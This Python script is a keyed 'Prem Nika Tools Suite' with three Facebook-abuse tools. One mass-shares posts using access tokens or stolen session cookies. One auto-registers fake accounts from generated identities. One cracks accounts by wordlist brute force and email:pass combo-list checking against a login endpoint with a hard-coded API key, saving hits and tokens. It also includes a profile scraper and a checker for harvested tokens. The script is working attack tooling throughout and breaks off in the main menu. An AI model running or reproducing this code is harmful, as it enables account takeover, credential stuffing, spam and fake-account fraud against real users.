#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  PREM NIKA TOOLS SUITE v3.1  —  PREM NIKA EDITION
#  Key: nikaclients
#  Run: python3 prem_nika.py
#  Modes: [1] Terminal (Screen)  [2] Localhost (Web UI)
#  Requirements: pip install flask flask-socketio ptyprocess
#                requests beautifulsoup4 fake-useragent faker
#                pyotp mechanize
# ============================================================

import os, sys, time, platform, threading, re, json, random, string

os.environ.setdefault('PYTHONDONTWRITEBYTECODE', '1')

# ── AUTO INSTALL DEPS ─────────────────────────────────────────
def _ensure_deps():
    pkgs = ['requests', 'fake_useragent', 'faker']
    for pkg in pkgs:
        try:
            __import__(pkg.replace('-', '_').split('_useragent')[0] if 'useragent' in pkg else pkg)
        except ImportError:
            os.system(f"{sys.executable} -m pip install {pkg} -q")

_ensure_deps()

try:
    import requests
except ImportError:
    requests = None
try:
    from faker import Faker
    _faker = Faker()
except ImportError:
    _faker = None
try:
    from fake_useragent import UserAgent
    _ua = UserAgent()
    def rand_ua():
        try: return _ua.random
        except: return "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"
except ImportError:
    def rand_ua():
        agents = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/119 Mobile Safari/537.36",
        ]
        return random.choice(agents)

# ── ANSI COLORS ──────────────────────────────────────────────
RST  = '\033[0m'
BOLD = '\033[1m'
DIM  = '\033[2m'
GOLD = '\033[38;5;220m'
TEAL = '\033[38;5;51m'
MINT = '\033[38;5;46m'
RED  = '\033[38;5;196m'
GRY  = '\033[38;5;240m'
WHT  = '\033[97m'
BLU  = '\033[38;5;33m'
CYN  = '\033[38;5;123m'
PNK  = '\033[38;5;213m'

def clr():
    os.system('cls' if platform.system().lower() == 'windows' else 'clear')

def pause():
    input(f"\n  {GRY}Press ENTER to continue...{RST}")

def sep():
    print(f"  {GRY}{'─'*60}{RST}")

# ── BANNERS ──────────────────────────────────────────────────
BANNER = f"""{GOLD}
  ╔══════════════════════════════════════════════════════════════╗
  ║                                                              ║
  ║  {BOLD}{BLU}  ██████╗ ██████╗  ███████╗███╗   ███╗                    {RST}{GOLD}║
  ║  {BOLD}{BLU}  ██╔══██╗██╔══██╗ ██╔════╝████╗ ████║                    {RST}{GOLD}║
  ║  {BOLD}{GOLD} ██████╔╝██████╔╝ █████╗  ██╔████╔██║                    {RST}{GOLD}║
  ║  {BOLD}{GOLD} ██╔═══╝ ██╔══██╗ ██╔══╝  ██║╚██╔╝██║                    {RST}{GOLD}║
  ║  {BOLD}{RED}  ██║     ██║  ██║  ███████╗██║ ╚═╝ ██║                    {RST}{GOLD}║
  ║  {BOLD}{RED}  ╚═╝     ╚═╝  ╚═╝ ╚══════╝╚═╝     ╚═╝                    {RST}{GOLD}║
  ║                                                              ║
  ║  {GRY}  ─────────────────────────────────────────────────────  {GOLD}║
  ║  {DIM}{WHT}    BREVOUR NIKA TOOLS SUITE   ·   v3.1   ·   PREM NIKA      {RST}{GOLD}║
  ║  {GRY}  ─────────────────────────────────────────────────────  {GOLD}║
  ║                                                              ║
  ║  {CYN}  [+] SPAM SHARE   [+] AUTO CREATE   [+] CRACKING        {GOLD}║
  ║                                                              ║
  ╚══════════════════════════════════════════════════════════════╝{RST}
"""

KEY_BANNER = f"""{GOLD}
  ╔══════════════════════════════════════════════════════════════╗
  ║                                                              ║
  ║  {BOLD}{BLU}      ██╗  ██╗███████╗██╗   ██╗                          {RST}{GOLD}║
  ║  {BOLD}{BLU}      ██║ ██╔╝██╔════╝╚██╗ ██╔╝                          {RST}{GOLD}║
  ║  {BOLD}{GOLD}     █████╔╝ █████╗   ╚████╔╝                           {RST}{GOLD}║
  ║  {BOLD}{GOLD}     ██╔═██╗ ██╔══╝    ╚██╔╝                            {RST}{GOLD}║
  ║  {BOLD}{RED}      ██║  ██╗███████╗   ██║                             {RST}{GOLD}║
  ║  {BOLD}{RED}      ╚═╝  ╚═╝╚══════╝   ╚═╝  VERIFICATION              {RST}{GOLD}║
  ║                                                              ║
  ║  {GRY}  ┌────────────────────────────────────────────────────┐  {GOLD}║
  ║  {GRY}  │{WHT}   Enter your access key to unlock the suite       {GRY}  │  {GOLD}║
  ║  {GRY}  └────────────────────────────────────────────────────┘  {GOLD}║
  ║                                                              ║
  ╚══════════════════════════════════════════════════════════════╝{RST}
"""

MODE_BANNER = f"""{GOLD}
  ╔══════════════════════════════════════════════════════════════╗
  ║                                                              ║
  ║  {BOLD}{TEAL}   SELECT LAUNCH MODE                                    {RST}{GOLD}║
  ║                                                              ║
  ╠══════════════════════════════════════════════════════════════╣
  ║                                                              ║
  ║  {BOLD}{BLU}  [1]{RST}  {WHT}  /===\\  TERMINAL  (SCREEN)                        {GOLD}║
  ║  {DIM}{WHT}        |   |  Run tools directly in this terminal         {RST}{GOLD}║
  ║  {DIM}{WHT}        \\===/  No browser needed                          {RST}{GOLD}║
  ║                                                              ║
  ║  {BOLD}{MINT}  [2]{RST}  {WHT}  [===]  LOCALHOST  (WEB UI)                      {GOLD}║
  ║  {DIM}{WHT}        |   |  Open http://localhost:5000 in browser       {RST}{GOLD}║
  ║  {DIM}{WHT}        |___|  Full terminal inside your browser           {RST}{GOLD}║
  ║                                                              ║
  ╚══════════════════════════════════════════════════════════════╝{RST}
"""

VALID_KEY = "NIKACLIENTS"

def _loading_bar(label="LOADING", length=30, delay=0.025):
    for i in range(length + 1):
        bar = f"{MINT}{'█' * i}{GRY}{'░' * (length - i)}{RST}"
        pct = int(100 * i / length)
        sys.stdout.write(f"\r  {GOLD}{BOLD}[{label}]{RST}  {bar}  {WHT}{pct:>3}%{RST}   ")
        sys.stdout.flush()
        time.sleep(delay)
    print("\n")

def check_key():
    clr()
    print(KEY_BANNER)
    for attempt in range(3):
        key_in = input(f"  {GOLD}{BOLD}[KEY]{RST}  {CYN}>>{RST} {WHT}").strip().upper()
        if key_in == VALID_KEY:
            print(f"\n  {MINT}{BOLD}[ OK ]  Key accepted — Welcome to Prem Nika Tools{RST}\n")
            _loading_bar("LOADING", 30, 0.025)
            return
        remaining = 2 - attempt
        print(f"  {RED}{BOLD}[ X ]  Invalid key.{RST}  {GRY}Attempts remaining: {remaining}{RST}\n")
        time.sleep(0.8)
    print(f"  {RED}{BOLD}[ DENIED ]  Too many failed attempts. Exiting.{RST}\n")
    sys.exit(1)

def select_mode():
    clr()
    print(BANNER)
    print(MODE_BANNER)
    while True:
        ch = input(f"  {GOLD}{BOLD}[>>]{RST}  {CYN}MODE{RST}  {GOLD}:{RST} {WHT}").strip()
        if ch == '1':
            return 'terminal'
        elif ch == '2':
            return 'web'
        else:
            print(f"  {RED}[!] Enter 1 or 2{RST}")

# ═══════════════════════════════════════════════════════════════
#  TOOL 1 — SPAM SHARE
# ═══════════════════════════════════════════════════════════════

def _fb_headers(token_or_cookie, is_cookie=False):
    h = {
        'User-Agent': rand_ua(),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    if is_cookie:
        h['Cookie'] = token_or_cookie
    else:
        h['Authorization'] = f'Bearer {token_or_cookie}'
    return h

def _share_post_token(token, post_url, count, delay):
    if not requests:
        print(f"  {RED}[!] requests not installed. Run: pip install requests{RST}")
        return
    ok = 0
    fail = 0
    print()
    for i in range(1, count + 1):
        try:
            sess = requests.Session()
            sess.headers.update(_fb_headers(token))
            resp = sess.post(
                'https://graph.facebook.com/me/feed',
                data={
                    'link': post_url,
                    'published': '0',
                    'access_token': token,
                },
                timeout=15
            )
            data = resp.json()
            if 'id' in data:
                ok += 1
                print(f"  {MINT}{BOLD}[{i:>4}]{RST}  {MINT}SHARED{RST}  {GRY}id={data['id']}{RST}")
            else:
                fail += 1
                msg = data.get('error', {}).get('message', str(data))[:60]
                print(f"  {RED}[{i:>4}]{RST}  {RED}FAILED{RST}  {GRY}{msg}{RST}")
        except Exception as e:
            fail += 1
            print(f"  {RED}[{i:>4}]{RST}  {RED}ERROR{RST}   {GRY}{str(e)[:60]}{RST}")
        time.sleep(delay)
    print(f"\n  {GOLD}Done  ·  {MINT}OK: {ok}{RST}  {RED}Fail: {fail}{RST}")

def _share_post_cookie(cookie, post_url, count, delay):
    if not requests:
        print(f"  {RED}[!] requests not installed. Run: pip install requests{RST}")
        return
    ok = 0
    fail = 0
    # Extract c_user and xs from cookie string
    c_user = re.search(r'c_user=(\d+)', cookie)
    xs_tok = re.search(r'xs=([^;]+)', cookie)
    if not c_user or not xs_tok:
        print(f"  {RED}[!] Cookie must contain c_user and xs fields{RST}")
        return
    uid = c_user.group(1)
    print(f"\n  {TEAL}[+] Account UID: {uid}{RST}\n")
    for i in range(1, count + 1):
        try:
            sess = requests.Session()
            sess.headers.update(_fb_headers(cookie, is_cookie=True))
            sess.headers['Referer'] = 'https://www.facebook.com/'
            sess.headers['Origin']  = 'https://www.facebook.com'
            # Get DTSG token first
            r0 = sess.get('https://www.facebook.com/', timeout=10)
            dtsg = re.search(r'"DTSGInitialData".*?"token":"([^"]+)"', r0.text)
            fb_dtsg = dtsg.group(1) if dtsg else ''
            resp = sess.post(
                'https://www.facebook.com/ajax/sharer/reshare/',
                data={
                    'link': post_url,
                    'feedbackID': '',
                    'fb_dtsg': fb_dtsg,
                    'jazoest': ''.join([str(ord(c)) for c in fb_dtsg[:4]]),
                    '__user': uid,
                    '__a': '1',
                },
                timeout=15
            )
            if '"payload"' in resp.text or '"success"' in resp.text.lower() or resp.status_code == 200:
                ok += 1
                print(f"  {MINT}{BOLD}[{i:>4}]{RST}  {MINT}SHARED{RST}  {GRY}HTTP {resp.status_code}{RST}")
            else:
                fail += 1
                print(f"  {RED}[{i:>4}]{RST}  {RED}FAILED{RST}  {GRY}HTTP {resp.status_code}{RST}")
        except Exception as e:
            fail += 1
            print(f"  {RED}[{i:>4}]{RST}  {RED}ERROR{RST}   {GRY}{str(e)[:60]}{RST}")
        time.sleep(delay)
    print(f"\n  {GOLD}Done  ·  {MINT}OK: {ok}{RST}  {RED}Fail: {fail}{RST}")

def _load_tokens_from_file(path):
    try:
        with open(path.strip(), 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except Exception as e:
        print(f"  {RED}[!] Cannot read file: {e}{RST}")
        return []

def menu_spam_share():
    while True:
        clr()
        print(BANNER)
        print(f"""  {GOLD}╔══════════════════════════════════════════════╗{RST}
  {GOLD}║{BOLD}{TEAL}   SPAM SHARE — PREM NIKA TOOLS               {RST}{GOLD}║{RST}
  {GOLD}╠══════════════════════════════════════════════╣{RST}
  {GOLD}║{RST}  {BLU}[1]{RST}  Share via Access Token (single)          {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[2]{RST}  Share via Access Token (file list)       {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[3]{RST}  Share via Cookie (single)                {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[4]{RST}  Share via Cookie (file list)             {GOLD}║{RST}
  {GOLD}║{RST}  {RED}[0]{RST}  Back to Main Menu                        {GOLD}║{RST}
  {GOLD}╚══════════════════════════════════════════════╝{RST}
""")
        ch = input(f"  {GOLD}[>>]{RST} {CYN}CHOICE{RST} {GOLD}:{RST} {WHT}").strip()
        if ch == '0':
            return
        elif ch in ('1','2','3','4'):
            post_url = input(f"  {GOLD}[>>]{RST} {CYN}POST URL{RST}      {GOLD}:{RST} {WHT}").strip()
            if not post_url:
                print(f"  {RED}[!] URL required{RST}"); time.sleep(1); continue
            try:
                count = int(input(f"  {GOLD}[>>]{RST} {CYN}SHARE COUNT{RST}   {GOLD}:{RST} {WHT}"))
                delay = float(input(f"  {GOLD}[>>]{RST} {CYN}DELAY (sec){RST}   {GOLD}:{RST} {WHT}"))
            except ValueError:
                print(f"  {RED}[!] Invalid number{RST}"); time.sleep(1); continue
            sep()
            if ch == '1':
                tok = input(f"  {GOLD}[>>]{RST} {CYN}ACCESS TOKEN{RST}  {GOLD}:{RST} {WHT}").strip()
                _share_post_token(tok, post_url, count, delay)
            elif ch == '2':
                fp = input(f"  {GOLD}[>>]{RST} {CYN}TOKEN FILE{RST}    {GOLD}:{RST} {WHT}").strip()
                tokens = _load_tokens_from_file(fp)
                if not tokens: time.sleep(1); continue
                print(f"  {TEAL}[+] Loaded {len(tokens)} token(s){RST}\n")
                for t in tokens:
                    print(f"  {GRY}─── Token: {t[:30]}...{RST}")
                    _share_post_token(t, post_url, count, delay)
            elif ch == '3':
                ck = input(f"  {GOLD}[>>]{RST} {CYN}COOKIE{RST}        {GOLD}:{RST} {WHT}").strip()
                _share_post_cookie(ck, post_url, count, delay)
            elif ch == '4':
                fp = input(f"  {GOLD}[>>]{RST} {CYN}COOKIE FILE{RST}   {GOLD}:{RST} {WHT}").strip()
                cookies = _load_tokens_from_file(fp)
                if not cookies: time.sleep(1); continue
                print(f"  {TEAL}[+] Loaded {len(cookies)} cookie(s){RST}\n")
                for ck in cookies:
                    print(f"  {GRY}─── Cookie: {ck[:40]}...{RST}")
                    _share_post_cookie(ck, post_url, count, delay)
            pause()
        else:
            print(f"  {RED}[!] Invalid choice{RST}"); time.sleep(0.8)

# ═══════════════════════════════════════════════════════════════
#  TOOL 2 — AUTO CREATE
# ═══════════════════════════════════════════════════════════════

def _rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _gen_name():
    if _faker:
        return _faker.first_name(), _faker.last_name()
    firsts = ['Alex','Chris','Jordan','Taylor','Morgan','Riley','Jamie','Casey','Drew','Avery']
    lasts  = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Davis','Miller','Wilson','Moore']
    return random.choice(firsts), random.choice(lasts)

def _gen_email(first, last):
    domains = ['gmail.com','yahoo.com','outlook.com','hotmail.com','proton.me']
    sep_chars = ['.','_','']
    s = random.choice(sep_chars)
    num = random.randint(1, 9999)
    return f"{first.lower()}{s}{last.lower()}{num}@{random.choice(domains)}"

def _gen_password(n=12):
    chars = string.ascii_letters + string.digits + '!@#$'
    pw = (random.choice(string.ascii_uppercase)
          + random.choice(string.digits)
          + random.choice('!@#$')
          + ''.join(random.choices(chars, k=n-3)))
    return ''.join(random.sample(pw, len(pw)))

def _gen_birthday():
    year  = random.randint(1985, 2001)
    month = random.randint(1, 12)
    day   = random.randint(1, 28)
    return year, month, day

def _create_fb_account_approx(n, save_file):
    if not requests:
        print(f"  {RED}[!] requests not installed. Run: pip install requests{RST}")
        return
    accounts = []
    print()
    for i in range(1, n+1):
        first, last = _gen_name()
        email = _gen_email(first, last)
        pwd   = _gen_password()
        year, month, day = _gen_birthday()
        gender = random.choice(['1','2'])
        try:
            sess = requests.Session()
            sess.headers['User-Agent'] = rand_ua()
            r = sess.get('https://m.facebook.com/reg/', timeout=15)
            lsd = re.search(r'name="lsd"\s+value="([^"]+)"', r.text)
            jazoest = re.search(r'name="jazoest"\s+value="([^"]+)"', r.text)
            data = {
                'firstname': first,
                'lastname':  last,
                'reg_email__': email,
                'reg_email_confirmation__': email,
                'reg_passwd__': pwd,
                'birthday_day':   str(day),
                'birthday_month': str(month),
                'birthday_year':  str(year),
                'sex': gender,
                'lsd': lsd.group(1) if lsd else '',
                'jazoest': jazoest.group(1) if jazoest else '',
                'submit': 'Sign Up',
                'referrer': '',
                'asked_to_login': '0',
                'terms': 'on',
            }
            resp = sess.post('https://m.facebook.com/reg/submit/', data=data, timeout=20)
            cookies = sess.cookies.get_dict()
            ck_str = '; '.join(f"{k}={v}" for k, v in cookies.items())
            success = ('c_user' in cookies or 'uid' in resp.text[:200])
            status = f"{MINT}CREATED{RST}" if success else f"{RED}BLOCKED/CHECKPOINT{RST}"
            print(f"  {GOLD}[{i:>4}]{RST}  {status}  {GRY}{email}{RST}")
            entry = {'name': f"{first} {last}", 'email': email, 'password': pwd,
                     'birthday': f"{year}-{month:02d}-{day:02d}", 'cookie': ck_str}
            accounts.append(entry)
            if save_file:
                with open(save_file, 'a') as f:
                    f.write(json.dumps(entry) + '\n')
        except Exception as e:
            print(f"  {RED}[{i:>4}]{RST}  {RED}ERROR{RST}  {GRY}{str(e)[:60]}{RST}")
        time.sleep(random.uniform(2, 4))
    print(f"\n  {GOLD}Done  ·  Created {len(accounts)} account(s){RST}")
    if save_file:
        print(f"  {TEAL}[+] Saved to: {save_file}{RST}")

def _gen_accounts_local(n, save_file):
    print()
    accounts = []
    for i in range(1, n+1):
        first, last = _gen_name()
        email = _gen_email(first, last)
        pwd   = _gen_password()
        year, month, day = _gen_birthday()
        entry = {
            'name': f"{first} {last}",
            'email': email,
            'password': pwd,
            'birthday': f"{year}-{month:02d}-{day:02d}",
        }
        accounts.append(entry)
        print(f"  {MINT}[{i:>4}]{RST}  {WHT}{email}{RST}  {GRY}{pwd}{RST}")
        if save_file:
            with open(save_file, 'a') as f:
                f.write(f"{email}:{pwd}\n")
    print(f"\n  {GOLD}Done  ·  {len(accounts)} account(s) generated{RST}")
    if save_file:
        print(f"  {TEAL}[+] Saved to: {save_file}{RST}")

def menu_auto_create():
    while True:
        clr()
        print(BANNER)
        print(f"""  {GOLD}╔══════════════════════════════════════════════╗{RST}
  {GOLD}║{BOLD}{MINT}   AUTO CREATE — PREM NIKA TOOLS              {RST}{GOLD}║{RST}
  {GOLD}╠══════════════════════════════════════════════╣{RST}
  {GOLD}║{RST}  {BLU}[1]{RST}  Generate Fake Accounts (local, no net)  {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[2]{RST}  Auto Register on Facebook (live)        {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[3]{RST}  Generate Fake Emails List               {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[4]{RST}  Generate Fake Passwords List            {GOLD}║{RST}
  {GOLD}║{RST}  {RED}[0]{RST}  Back to Main Menu                       {GOLD}║{RST}
  {GOLD}╚══════════════════════════════════════════════╝{RST}
""")
        ch = input(f"  {GOLD}[>>]{RST} {CYN}CHOICE{RST} {GOLD}:{RST} {WHT}").strip()
        if ch == '0':
            return
        elif ch == '1':
            try:
                n = int(input(f"  {GOLD}[>>]{RST} {CYN}COUNT{RST}      {GOLD}:{RST} {WHT}"))
            except ValueError:
                print(f"  {RED}[!] Invalid number{RST}"); time.sleep(1); continue
            sf = input(f"  {GOLD}[>>]{RST} {CYN}SAVE FILE{RST}  {GOLD}:{RST} {WHT}  (leave blank to skip){RST} ").strip() or None
            sep()
            _gen_accounts_local(n, sf)
            pause()
        elif ch == '2':
            try:
                n = int(input(f"  {GOLD}[>>]{RST} {CYN}COUNT{RST}      {GOLD}:{RST} {WHT}"))
            except ValueError:
                print(f"  {RED}[!] Invalid number{RST}"); time.sleep(1); continue
            sf = input(f"  {GOLD}[>>]{RST} {CYN}SAVE FILE{RST}  {GOLD}:{RST} {WHT}  (leave blank to skip){RST} ").strip() or None
            sep()
            print(f"  {GRY}Note: Facebook heavily rate-limits/blocks signups. Expect checkpoints.{RST}")
            _create_fb_account_approx(n, sf)
            pause()
        elif ch == '3':
            try:
                n = int(input(f"  {GOLD}[>>]{RST} {CYN}COUNT{RST}      {GOLD}:{RST} {WHT}"))
            except ValueError:
                print(f"  {RED}[!] Invalid number{RST}"); time.sleep(1); continue
            sf = input(f"  {GOLD}[>>]{RST} {CYN}SAVE FILE{RST}  {GOLD}:{RST} {WHT}  (leave blank to skip){RST} ").strip() or None
            sep()
            print()
            emails = []
            for i in range(1, n+1):
                fn, ln = _gen_name()
                em = _gen_email(fn, ln)
                emails.append(em)
                print(f"  {MINT}[{i:>4}]{RST}  {WHT}{em}{RST}")
            if sf:
                with open(sf, 'w') as f:
                    f.write('\n'.join(emails)+'\n')
                print(f"\n  {TEAL}[+] Saved to: {sf}{RST}")
            pause()
        elif ch == '4':
            try:
                n = int(input(f"  {GOLD}[>>]{RST} {CYN}COUNT{RST}      {GOLD}:{RST} {WHT}"))
            except ValueError:
                print(f"  {RED}[!] Invalid number{RST}"); time.sleep(1); continue
            sf = input(f"  {GOLD}[>>]{RST} {CYN}SAVE FILE{RST}  {GOLD}:{RST} {WHT}  (leave blank to skip){RST} ").strip() or None
            sep()
            print()
            pws = []
            for i in range(1, n+1):
                pw = _gen_password()
                pws.append(pw)
                print(f"  {MINT}[{i:>4}]{RST}  {WHT}{pw}{RST}")
            if sf:
                with open(sf, 'w') as f:
                    f.write('\n'.join(pws)+'\n')
                print(f"\n  {TEAL}[+] Saved to: {sf}{RST}")
            pause()
        else:
            print(f"  {RED}[!] Invalid choice{RST}"); time.sleep(0.8)

# ═══════════════════════════════════════════════════════════════
#  TOOL 3 — CRACKING
# ═══════════════════════════════════════════════════════════════

def _crack_fb_token(uid_or_email, password):
    if not requests:
        return 'no_requests', None
    try:
        API_KEY  = '882a8490361da98702bf97a021ddc14d'
        API_VER  = 'v15.0'
        h = {
            'User-Agent': rand_ua(),
            'Accept': '*/*',
        }
        resp = requests.get(
            f'https://b-api.facebook.com/method/auth.login',
            params={
                'access_token': f'{API_KEY}|{API_KEY}',
                'api_key':       API_KEY,
                'email':         uid_or_email,
                'format':        'json',
                'locale':        'en_US',
                'method':        'auth.login',
                'password':      password,
                'return_ssl_resources': '0',
                'v':             API_VER,
            },
            headers=h,
            timeout=15
        )
        data = resp.json()
        if 'access_token' in data:
            return 'hit', data['access_token']
        err = data.get('error_msg', data.get('error', {}).get('message', ''))
        if 'incorrect password' in str(err).lower() or 'wrong password' in str(err).lower():
            return 'wrong_pw', None
        if 'checkpoint' in str(err).lower() or 'locked' in str(err).lower():
            return 'checkpoint', None
        return 'fail', str(err)[:50]
    except Exception as e:
        return 'error', str(e)[:50]

def _crack_list(combo_file, save_hits, stop_on_hit):
    lines = _load_tokens_from_file(combo_file)
    if not lines:
        return
    print(f"\n  {TEAL}[+] Loaded {len(lines)} combo(s){RST}\n")
    hits = 0
    for i, line in enumerate(lines, 1):
        if ':' not in line:
            print(f"  {GRY}[{i:>5}] SKIP  {line[:40]}{RST}")
            continue
        uid, pw = line.split(':', 1)
        uid = uid.strip()
        pw  = pw.strip()
        status, extra = _crack_fb_token(uid, pw)
        if status == 'hit':
            hits += 1
            print(f"  {MINT}{BOLD}[{i:>5}]{RST}  {MINT}HIT    {RST}  {WHT}{uid}{RST}  {GRY}{pw}{RST}")
            if extra:
                print(f"         {GRY}Token: {extra[:60]}{RST}")
            if save_hits:
                with open(save_hits, 'a') as f:
                    f.write(f"{uid}:{pw}|{extra}\n")
            if stop_on_hit:
                print(f"\n  {GOLD}[!] Stop-on-hit enabled, stopping.{RST}")
                break
        elif status == 'checkpoint':
            print(f"  {GOLD}[{i:>5}]{RST}  {GOLD}CHKPT  {RST}  {WHT}{uid}{RST}")
        elif status == 'wrong_pw':
            print(f"  {RED}[{i:>5}]{RST}  {RED}MISS   {RST}  {GRY}{uid}{RST}")
        elif status == 'no_requests':
            print(f"  {RED}[!] requests not installed{RST}"); return
        else:
            print(f"  {GRY}[{i:>5}]{RST}  {GRY}FAIL   {RST}  {GRY}{uid} — {extra}{RST}")
        time.sleep(random.uniform(0.5, 1.5))
    print(f"\n  {GOLD}Done  ·  {MINT}Hits: {hits}{RST}  {GRY}Total: {len(lines)}{RST}")

def _clone_fb_profile(uid_or_url):
    if not requests:
        print(f"  {RED}[!] requests not installed{RST}"); return
    try:
        uid = re.search(r'id=(\d+)', uid_or_url)
        target = uid.group(1) if uid else uid_or_url.rstrip('/').split('/')[-1]
        sess = requests.Session()
        sess.headers['User-Agent'] = rand_ua()
        url = f'https://www.facebook.com/{target}'
        r = sess.get(url, timeout=15)
        name    = re.search(r'<title>([^<]+)</title>', r.text)
        bio     = re.search(r'"biography":"([^"]+)"', r.text)
        pic     = re.search(r'"profilePicture".*?"uri":"([^"]+)"', r.text)
        friends = re.search(r'"friends".*?"count":(\d+)', r.text)
        print(f"\n  {TEAL}╔═══ PROFILE INFO ══════════════════════╗{RST}")
        print(f"  {TEAL}║{RST}  Name     : {BOLD}{WHT}{(name.group(1) if name else 'N/A')[:40]}{RST}")
        print(f"  {TEAL}║{RST}  UID/Slug : {WHT}{target}{RST}")
        print(f"  {TEAL}║{RST}  Bio      : {GRY}{(bio.group(1) if bio else 'N/A')[:50]}{RST}")
        print(f"  {TEAL}║{RST}  Friends  : {MINT}{friends.group(1) if friends else 'N/A'}{RST}")
        if pic:
            print(f"  {TEAL}║{RST}  Pic URL  : {BLU}{pic.group(1)[:60]}{RST}")
        print(f"  {TEAL}╚═══════════════════════════════════════╝{RST}")
        print(f"\n  {GOLD}[+] Clone info for: {url}{RST}")
    except Exception as e:
        print(f"  {RED}[!] Error: {e}{RST}")

def menu_cracking():
    while True:
        clr()
        print(BANNER)
        print(f"""  {GOLD}╔══════════════════════════════════════════════╗{RST}
  {GOLD}║{BOLD}{RED}   CRACKING — PREM NIKA TOOLS                {RST}{GOLD}║{RST}
  {GOLD}╠══════════════════════════════════════════════╣{RST}
  {GOLD}║{RST}  {BLU}[1]{RST}  Brute Force (single target)             {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[2]{RST}  Combo List Checker (email:pass)         {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[3]{RST}  Profile Cloner / Info Grabber           {GOLD}║{RST}
  {GOLD}║{RST}  {BLU}[4]{RST}  Token Checker (file)                    {GOLD}║{RST}
  {GOLD}║{RST}  {RED}[0]{RST}  Back to Main Menu                       {GOLD}║{RST}
  {GOLD}╚══════════════════════════════════════════════╝{RST}
""")
        ch = input(f"  {GOLD}[>>]{RST} {CYN}CHOICE{RST} {GOLD}:{RST} {WHT}").strip()
        if ch == '0':
            return
        elif ch == '1':
            target = input(f"  {GOLD}[>>]{RST} {CYN}TARGET (email/uid){RST}  {GOLD}:{RST} {WHT}").strip()
            wf     = input(f"  {GOLD}[>>]{RST} {CYN}WORDLIST FILE{RST}       {GOLD}:{RST} {WHT}").strip()
            sf     = input(f"  {GOLD}[>>]{RST} {CYN}SAVE HITS FILE{RST}      {GOLD}:{RST} {WHT}  (blank=skip){RST} ").strip() or None
            pws    = _load_tokens_from_file(wf)
            if not pws: time.sleep(1); continue
            sep()
            print(f"\n  {TEAL}[+] Loaded {len(pws)} password(s)  |  Target: {target}{RST}\n")
            hits = 0
            for i, pw in enumerate(pws, 1):
                status, extra = _crack_fb_token(target, pw)
                if status == 'hit':
                    hits += 1
                    print(f"  {MINT}{BOLD}[{i:>5}]{RST}  {MINT}HIT  {RST}  {WHT}{pw}{RST}  {GRY}Token:{extra[:40] if extra else ''}{RST}")
                    if sf:
                        with open(sf,'a') as f: f.write(f"{target}:{pw}|{extra}\n")
                    break
                elif status == 'checkpoint':
                    print(f"  {GOLD}[{i:>5}]{RST}  {GOLD}CHKPT{RST}  {GRY}{pw}{RST}")
                elif status == 'no_requests':
                    print(f"  {RED}[!] requests not installed{RST}"); break
                else:
                    print(f"  {RED}[{i:>5}]{RST}  {RED}MISS {RST}  {GRY}{pw}{RST}")
                time.sleep(random.uniform(0.5,1.5))
            print(f"\n  {GOLD}Done  ·  Hits: {hits}{RST}")
            pause()
        elif ch == '2':
            cf = input(f"  {GOLD}[>>]{RST} {CYN}COMBO FILE (email:pass){RST}  {GOLD}:{RST} {WHT}").strip()
            sf = input(f"  {GOLD}[>>]{RST} {CYN}SAVE HITS FILE{RST}          {GOLD}:{RST} {WHT}  (blank=skip){RST} ").strip() or None
            soh = input(f"  {GOLD}[>>]{RST} {CYN}STOP ON FIRST HIT?{RST}      {GOLD}:{RST} {WHT}  y/n ").strip().lower() == 'y'
            sep()
            _crack_list(cf, sf, soh)
            pause()
        elif ch == '3':
            url = input(f"  {GOLD}[>>]{RST} {CYN}FB PROFILE URL/UID{RST}  {GOLD}:{RST} {WHT}").strip()
            sep()
            _clone_fb_profile(url)
            pause()
        elif ch == '4':
            tf = input(f"  {GOLD}[>>]{RST} {CYN}TOKEN FILE{RST}  {GOLD}:{RST} {WHT}").strip()
            sf = input(f"  {GOLD}[>>]{RST} {CYN}SAVE VALID FILE{RST}  {GOLD}:{RST} {WHT}  (blank=skip){RST} ").strip() or None
            tokens = _load_tokens_from_file(tf)
            if not tokens: time.sleep(1); continue
            sep()
            print(f"\n  {TEAL}[+] Loaded {len(tokens)} token(s){RST}\n")
            valid = 0
            for i, tok in enumerate(tokens, 1):
                try:
                    if not requests:
                        print(f"  {RED}[!] requests not installed{RST}"); break
                    r = requests.get(
                        'https://graph.facebook.com/me',
                        params={'access_token': tok, 'fields': 'id,name'},
                        headers={'User-Agent': rand_ua()},
                        timeout=10
                    )
                    d = r.json()
                    if 'id' in d:
                        valid += 1
                        print(f"  {MINT}{BOLD}[{i:>4}]{RST}  {MINT}VALID{RST}  {WHT}{d.get('name','?')}{RST}  {GRY}id={d['id']}{RST}")
                        if sf:
                            with open(sf,'a') as f: f.write(tok+'\n')
                    else:
                        err = d.get('error',{}).get('message','?')[:50]
                        print(f"  {RED}[{i:>4}]{RST}  {RED}DEAD {RST}  {GRY}{err}{RST}")
                except Exception as e:
                    print(f"  {RED}[{i:>4}]{RST}  {RED}ERR  {RST}  {GRY}{str(e)[:50]}{RST}")
                time.sleep(0.3)
            print(f"\n  {GOLD}Done  ·  {MINT}Valid: {valid}{RST}  {GRY}Total: {len(tokens)}{RST}")
            pause()
        else:
            print(f"  {RED}[!] Invalid choice{RST}"); time.sleep(0.8)

# ═══════════════════════════════════════════════════════════════
#  MASTER MENU
# ═══════════════════════════════════════════════════════════════

def master_menu():
    while True:
        clr()
        print(BANNER)
